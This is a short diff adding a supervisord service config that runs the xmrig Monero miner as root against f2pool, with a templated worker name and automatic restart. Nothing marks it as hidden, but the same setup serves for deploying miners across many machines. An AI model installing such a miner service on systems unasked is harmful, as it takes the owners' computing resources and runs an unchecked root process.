@@ -1,0 +1,14 @@
+[program:srv.monero]
+command = /opt/src/monero/xmrig -o xmr.f2pool.com:13531 -u polaris2018.{{data['worker_name']}} -p x -k
+directory=/opt/monero
+
+numprocs=1
+numprocs_start=0
+
+logfile_maxbytes = 20MB
+logfile_backups = 10
+
+autorestart=true
+startsecs=0
+
+user=root
